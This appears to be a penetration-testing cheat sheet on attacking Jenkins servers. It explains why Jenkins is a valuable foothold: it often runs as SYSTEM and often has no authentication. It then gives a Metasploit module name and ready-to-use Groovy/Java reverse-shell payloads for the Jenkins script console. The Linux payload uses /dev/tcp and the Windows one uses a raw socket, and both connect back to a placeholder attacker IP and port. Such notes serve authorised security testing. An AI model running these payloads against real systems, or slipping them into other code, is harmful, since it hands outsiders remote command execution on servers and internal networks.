# Jenkins

## **Introduction**

> * Jenkins is a continuous integration server.
> * Jenkins runs on Tomcat port 8080 by default
> * The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account.
> * Jenkins if often inside internal networks
> * Jenkins is often installed on Windows servers running as the SYSTEM account.
> * If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.
> * It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test
> * We can fingerprint Jenkins quickly by the telltale login page.

***

## **Jenkins Script Console RCE \[Authenticated]**

> * After gaining access to a Jenkins application, you can navigate to the script console: `http://jenkins.test.example:8000/script`
> * The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime.
> * This can be abused to run operating system commands on the underlying server.

**Linux PoC Script:**

* MSFConsole: `use exploit/multi/http/jenkins_script_console`
*   Reverse shell:

    ```
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/your-attacker-ip/your-nc-port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    ```

**Windows PoC Script:**

*   Reverse shell:

    ```
    String host="your-attacker-ip";
    int port=your-nc-port;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    ```
